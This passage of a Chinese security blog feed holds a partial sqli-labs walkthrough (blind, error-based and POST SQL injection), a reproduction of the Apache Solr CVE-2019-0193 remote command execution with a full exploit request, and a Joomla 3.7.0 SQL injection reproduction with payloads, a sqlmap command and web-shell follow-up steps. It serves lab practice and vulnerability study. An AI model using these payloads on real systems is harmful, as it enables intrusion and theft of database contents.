class="line">?id&#x3D;1&#39; and substr((select schema_name from information_schema.schemata limit 0,1),1,1) &gt; &#39;a&#39; -- +</span><br></pre></td></tr></table></figure><p><img src="/images/1575282576022.png" alt="1575282576022"></p><p>说明大于a</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 第一个数据库的第二个字母 是否大于 s</span><br><span class="line">?id&#x3D;1&#39; and substr((select schema_name from information_schema.schemata limit 0,1),1,1) &gt; &#39;s&#39; -- +</span><br></pre></td></tr></table></figure><p><img src="/images/1575282621253.png" alt="1575282621253"></p><p>说明小于a</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">是否等于 i</span><br><span class="line">?id&#x3D;1&#39; and substr((select schema_name from information_schema.schemata limit 0,1),1,1) &#x3D; &#39;i&#39; -- +</span><br></pre></td></tr></table></figure><p><img src="/images/1575282685798.png" alt="1575282685798"></p><p>说明第一个数据库的第一个字母是 i </p><p>然后不断调整substr函数截取的字母，就能猜出第一个数据的全名，然后移动 limit 后的数字继续猜测第二数据库名字。不多说了。</p><h4 id="第九关：单引号-时间盲注"><a href="#第九关：单引号-时间盲注" class="headerlink" title="第九关：单引号+时间盲注"></a>第九关：单引号+时间盲注</h4><p>一直不太清楚基于时间盲注和布尔型注入的区别，做了一遍题，才深有体会。同样需要看看怎么闭合引号、括号。你会发现在这里，不管你怎么输入，都不会有异常显示出来。这时候就考虑下延时注入。</p><p>使用下面的payload，会延时10s，说明是闭合单引号的时间盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;2&#39; and sleep(10) -- +</span><br></pre></td></tr></table></figure><p><img src="/images/1575283197886.png" alt="1575283197886"></p><p>这时候就可以构造payload了，步骤和上面基本类似，挨个挨个字母判断：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;2&#39; and if(substr((select schema_name from information_schema.schemata limit 0,1),1,1)&#x3D;&#39;i&#39;, sleep(10), 1) -- +</span><br></pre></td></tr></table></figure><p>对照着上面来。不写了。</p><h4 id="第十关：双引号-时间盲注"><a href="#第十关：双引号-时间盲注" class="headerlink" title="第十关：双引号+时间盲注"></a>第十关：双引号+时间盲注</h4><p>把 <code>?id=2&#39; </code> 换成 <code>?id=2&quot; </code> 其他的都不变。参考第九关</p><h4 id="第十一关：POST注入"><a href="#第十一关：POST注入" class="headerlink" title="第十一关：POST注入"></a>第十一关：POST注入</h4><blockquote><p>输入用户名：name          密码：pass’ #</p><p>输入用户名：name’ #      密码：pass</p></blockquote><p>均没有报错，猜测用户名和密码都可是注入。然后就开始各种尝试了</p><p><strong>用户名处注入</strong></p><p>用户名输入一个数据库中不存在的，因为报错了才能回显，如我这里输入用户名：<code>/&#39; union select version(),2 #</code>，输入密码：123456</p><p><img src="/images/1575285329144.png" alt="1575285329144"></p><p>看到数据库版本：</p><p><img src="/images/1575285367051.png" alt="1575285367051"></p><p><strong>密码处注入</strong></p><p>用户名随便输，密码写成：<code>pass&#39; union select version(),2 #</code></p><p><img src="/images/1575284897360.png" alt="1575284897360"></p><p>就能看到version了</p><p><img src="/images/1575284927547.png" alt="1575284927547"></p><p>剩下的就和回显注入一模一样了。不多说了</p><h4 id="第十二关：双引号-括号-回显注入"><a href="#第十二关：双引号-括号-回显注入" class="headerlink" title="第十二关：双引号+括号+回显注入"></a>第十二关：双引号+括号+回显注入</h4><blockquote><p>用户名：admin</p><p>密码：123”) union select version(),2 #</p></blockquote><p><img src="/images/1575285504613.png" alt="1575285504613"></p><p>得到返回结果：</p><p><img src="/images/1575285541418.png" alt="1575285541418"></p><p>和上面重复率太高，不写了。</p><h4 id="第十三关：单引号-括号-报错型注入"><a href="#第十三关：单引号-括号-报错型注入" class="headerlink" title="第十三关：单引号+括号+报错型注入"></a>第十三关：单引号+括号+报错型注入</h4><blockquote><p>用户名：admin’) and (select 1 from (select count(*),concat((select concat(schema_name) from information_schema.schemata limit 5,1),floor(rand(0)*2))x from information_schema.tables group by x)a) #</p><p>密码：随便写</p></blockquote><p><img src="/images/1575286265096.png" alt="1575286265096"></p><h4 id="第十四关：双引号-报错注入"><a href="#第十四关：双引号-报错注入" class="headerlink" title="第十四关：双引号+报错注入"></a>第十四关：双引号+报错注入</h4><blockquote><p>输入用户名：admin’) and 1=1 #</p><p>输入密码：123</p></blockquote><p>报错信息如下：</p><p><img src="/images/1575286400792.png" alt="1575286400792"></p><p>构造payload</p><blockquote><p>用户名：admin’) and (select 1 from (select count(*),concat((select concat(schema_name) from information_schema.schemata limit 5,1),floor(rand(0)*2))x from information_schema.tables group by x)a) #</p><p>密码：随便写</p></blockquote><p><img src="/images/1575286518365.png" alt="1575286518365"></p><p>不搞了。</p><h4 id="第十五关：单引号-布尔型盲注"><a href="#第十五关：单引号-布尔型盲注" class="headerlink" title="第十五关：单引号+布尔型盲注"></a>第十五关：单引号+布尔型盲注</h4><blockquote><p>用户名：admin’ and substr((select schema_name from information_schema.schemata limit 0,1),1,1) &gt; ‘a’</p><p>密   码：随便写</p></blockquote><p>通过是否登录成功判断每个字母的正确性。参考第八关</p><h4 id="第十六关：双引号-布尔型注入"><a href="#第十六关：双引号-布尔型注入" class="headerlink" title="第十六关：双引号+布尔型注入"></a>第十六关：双引号+布尔型注入</h4><blockquote><p>用户名：admin“ and substr((select schema_name from information_schema.schemata limit 0,1),1,1) &gt; ‘a’</p><p>密   码：随便写</p></blockquote><p>通过是否登录成功判断每个字母的正确性。参考第八关</p><h4 id="第十七关：单引号-报错注入"><a href="#第十七关：单引号-报错注入" class="headerlink" title="第十七关：单引号+报错注入"></a>第十七关：单引号+报错注入</h4><blockquote><p>用户名：admin</p><p>密   码：123’ and extractvalue(1,concat(0x7e,(payload),0x7e))#</p></blockquote><p>一直尝试时间注入，回车后网页一直加载不出来。</p><p><img src="/images/1575982545159.png" alt="1575982545159"></p><p>看下源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$update&#x3D;&quot;UPDATE users SET password &#x3D; &#39;$passwd&#39; WHERE username&#x3D;&#39;$row1&#39;&quot;;</span><br></pre></td></tr></table></figure><p>然后在mysql命令行中尝试了下</p><p><img src="/images/1575982647934.png" alt="1575982647934"></p><p>最后发现要想使用时间注入，你要把后面哪个用户名给加上才行。也就是：</p><blockquote><p>用户名：admin</p><p>密   码：123’ where username=’admin’ and sleep(10) #</p></blockquote><p><img src="/images/1575982769901.png" alt="1575982769901"></p><p>郁闷一分钟。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;sqli-labs通关&quot;&gt;&lt;a href=&quot;#sqli-labs通关&quot; class=&quot;headerlink&quot; title=&quot;sqli-labs通关&quot;&gt;&lt;/a&gt;sqli-labs通关&lt;/h1&gt;&lt;h2 id=&quot;Basic-Challenges-1-18关&quot;&gt;&lt;a href=&quot;#Basic-Challenges-1-18关&quot; class=&quot;headerlink&quot; title=&quot;Basic Challenges(1-18关)&quot;&gt;&lt;/a&gt;Basic Challenges(1-18关)&lt;/h2&gt;</summary>
    
    
    
    <category term="sql注入练习" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0/"/>
    
    
    <category term="靶机训练" scheme="http://example.com/tags/%E9%9D%B6%E6%9C%BA%E8%AE%AD%E7%BB%83/"/>
    
  </entry>
  
  <entry>
    <title>Apache Solr 远程命令执行漏洞复现</title>
    <link href="http://example.com/2019/11/05/Apache-Solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2019/11/05/Apache-Solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2019-11-05T15:07:13.000Z</published>
    <updated>2019-11-06T08:12:33.225Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2019-0193：Apache-Solr-远程命令执行漏洞复现"><a href="#CVE-2019-0193：Apache-Solr-远程命令执行漏洞复现" class="headerlink" title="CVE-2019-0193：Apache Solr 远程命令执行漏洞复现"></a>CVE-2019-0193：Apache Solr 远程命令执行漏洞复现</h2><h3 id="Apache-solr-介绍"><a href="#Apache-solr-介绍" class="headerlink" title="Apache solr 介绍"></a>Apache solr 介绍</h3><p>Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。 </p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Solr &lt;= 8.2.0且开启了dataimport功能(目前无补丁) </p><a id="more"></a><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载地址：<a href="http://www.apache.org/dyn/closer.lua/lucene/solr/7.7.2/solr-7.7.2.zip">http://www.apache.org/dyn/closer.lua/lucene/solr/7.7.2/solr-7.7.2.zip</a> </p><p>在solr-7.7.2目录中，执行命令 <code>bin/solr -e dih</code></p><p><img src="/images/1572966771086.png" alt="1572966771086"></p><p>访问 <code>http://127.0.0.1:8983</code></p><p><img src="/images/1572966833695.png" alt="1572966833695"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>通过接口 <code>curl http://127.0.0.1:8983/solr/admin/cores  </code>获取所有 core 信息，下面我们构造 payload 需要 name 信息</p><p><img src="/images/1572966947773.png" alt="1572966947773"></p><p>使用burpsuite发送下面包。替换相应的<core_name>就行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;solr&#x2F;&lt;修改这里&gt;&#x2F;dataimport HTTP&#x2F;1.1</span><br><span class="line">Host: 10.10.10.22:8983</span><br><span class="line">Content-Length: 496</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0</span><br><span class="line">Content-type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">command&#x3D;full-import&amp;verbose&#x3D;false&amp;clean&#x3D;false&amp;commit&#x3D;true&amp;debug&#x3D;true&amp;core&#x3D;&lt;修改这里&gt;&amp;name&#x3D;dataimport&amp;dataConfig&#x3D;</span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line">&lt;dataSource type&#x3D;&quot;URLDataSource&quot;&#x2F;&gt;</span><br><span class="line">&lt;script&gt;&lt;![CDATA[</span><br><span class="line">function poc(row)&#123;</span><br><span class="line">var process&#x3D; java.lang.Runtime.getRuntime();</span><br><span class="line">process.exec(&quot;calc.exe&quot;);</span><br><span class="line">return row;</span><br><span class="line">&#125;</span><br><span class="line">]]&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;document&gt;</span><br><span class="line">&lt;entity name&#x3D;&quot;stackoverflow&quot;</span><br><span class="line">url&#x3D;&quot;https:&#x2F;&#x2F;stackoverflow.com&#x2F;feeds&#x2F;tag&#x2F;solr&quot;</span><br><span class="line">processor&#x3D;&quot;XPathEntityProcessor&quot;</span><br><span class="line">forEach&#x3D;&quot;&#x2F;feed&quot;</span><br><span class="line">transformer&#x3D;&quot;script:poc&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;document&gt;</span><br><span class="line">&lt;&#x2F;dataConfig&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/1572967173262.png" alt="1572967173262"></p><p>上面的命令是弹出计算机。</p><p><img src="/images/1572967142750.png" alt="1572967142750"></p><p>尝试了多次，有时候能成功。感觉，不好使用。</p><p>给出一个POC：<code>https://github.com/jas502n/CVE-2019-0193/blob/master/CVE-2019-0193.py </code></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1.升级到最新版本,设置<code>enable.dih.dataConfigParam</code>为<code>false</code>(目前最新版本为8.2.0)</p><p>2.暂时关闭<code>dataimport</code>功能</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;CVE-2019-0193：Apache-Solr-远程命令执行漏洞复现&quot;&gt;&lt;a href=&quot;#CVE-2019-0193：Apache-Solr-远程命令执行漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;CVE-2019-0193：Apache Solr 远程命令执行漏洞复现&quot;&gt;&lt;/a&gt;CVE-2019-0193：Apache Solr 远程命令执行漏洞复现&lt;/h2&gt;&lt;h3 id=&quot;Apache-solr-介绍&quot;&gt;&lt;a href=&quot;#Apache-solr-介绍&quot; class=&quot;headerlink&quot; title=&quot;Apache solr 介绍&quot;&gt;&lt;/a&gt;Apache solr 介绍&lt;/h3&gt;&lt;p&gt;Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。 &lt;/p&gt;
&lt;h3 id=&quot;影响范围&quot;&gt;&lt;a href=&quot;#影响范围&quot; class=&quot;headerlink&quot; title=&quot;影响范围&quot;&gt;&lt;/a&gt;影响范围&lt;/h3&gt;&lt;p&gt;Solr &amp;lt;= 8.2.0且开启了dataimport功能(目前无补丁) &lt;/p&gt;</summary>
    
    
    
    
    <category term="Solr 远程命令执行" scheme="http://example.com/tags/Solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="CVE-2019-0193" scheme="http://example.com/tags/CVE-2019-0193/"/>
    
  </entry>
  
  <entry>
    <title>joomla之sql注入</title>
    <link href="http://example.com/2019/11/05/joomla%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2019/11/05/joomla%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/</id>
    <published>2019-11-05T13:06:27.000Z</published>
    <updated>2019-11-06T08:12:49.275Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Joomla-3-7-0-Core-com-fields组件SQL注入"><a href="#Joomla-3-7-0-Core-com-fields组件SQL注入" class="headerlink" title="Joomla 3.7.0 Core com_fields组件SQL注入"></a>Joomla 3.7.0 Core com_fields组件SQL注入</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>joomla是国外的一款内容管理系统，属于Portal（企业入口网站）类型，比较适合作为商业类型的网站程序源码。Joomla!采用时下流行的PHP语言和MySQL数据库开发的网站内容管理系统，支持在Linux、Windows和MacOSX等不同的平台上执行，是全球最受欢迎的开源CMS内容管理系统之一。 </p><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>攻击者可以通过sql注入获取到数据库内所有用户信息，如果数据库权限比较大，攻击者可以直接获取到服务器的权限等。</p><a id="more"></a><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ol><li><p>可以直接用docker：<code>https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2017-8917 </code>直接登录<code>http://target:8080/</code>。</p></li><li><p>网站源码：<code>https://github.com/joomla/joomla-cms/releases/download/3.7.0/Joomla_3.7.0-Stable-Full_Package.zip</code></p></li></ol><p>进入安装界面</p><p><img src="/images/1572959299592.png" alt="1572959299592"></p><p><img src="/images/1572959346422.png" alt="1572959346422"></p><p><img src="/images/1572959457487.png" alt="1572959457487"></p><p>确认安装即可。</p><p><img src="/images/1572959503531.png" alt="1572959503531"></p><p>访问主页</p><p><img src="/images/1572963875436.png" alt="1572963875436"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问</p><p><code>/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,user()),0)</code></p><p><img src="/images/1572963931832.png" alt="1572963931832"></p><p>使用sqlmap直接能跑出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;10.10.10.24&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml*&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/1573024005832.png" alt="1573024005832"></p><h3 id="进一步渗透思路"><a href="#进一步渗透思路" class="headerlink" title="进一步渗透思路"></a>进一步渗透思路</h3><p>获取网站后台登录的用户名密码  —》 上传shell  –》 菜刀连接</p><p>获取mysql用户名的hash –》 解密  –》 远程连接mysql  –》 写入木马  –》菜刀连接</p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol><li>及时到官网更新最新版本的joomla</li><li>一定要将数据库的用户权限最小化，以免带来更大的危险</li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Joomla-3-7-0-Core-com-fields组件SQL注入&quot;&gt;&lt;a href=&quot;#Joomla-3-7-0-Core-com-fields组件SQL注入&quot; class=&quot;headerlink&quot; title=&quot;Joomla 3.7.0 Core com_fields组件SQL注入&quot;&gt;&lt;/a&gt;Joomla 3.7.0 Core com_fields组件SQL注入&lt;/h2&gt;&lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;joomla是国外的一款内容管理系统，属于Portal（企业入口网站）类型，比较适合作为商业类型的网站程序源码。Joomla!采用时下流行的PHP语言和MySQL数据库开发的网站内容管理系统，支持在Linux、Windows和MacOSX等不同的平台上执行，是全球最受欢迎的开源CMS内容管理系统之一。 &lt;/p&gt;
&lt;h3 id=&quot;漏洞危害&quot;&gt;&lt;a href=&quot;#漏洞危害&quot; class=&quot;headerlink&quot; title=&quot;漏洞危害&quot;&gt;&lt;/a&gt;漏洞危害&lt;/h3&gt;&lt;p&gt;攻击者可以通过sql注入获取到数据库内所有用户信息，如果数据库权限比较大，攻击者可以直接获取到服务器的权限等。&lt;/p&gt;</summary>
    
    
    
    
    <category term="joomla" scheme="http://example.com/tags/joomla/"/>
    
    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
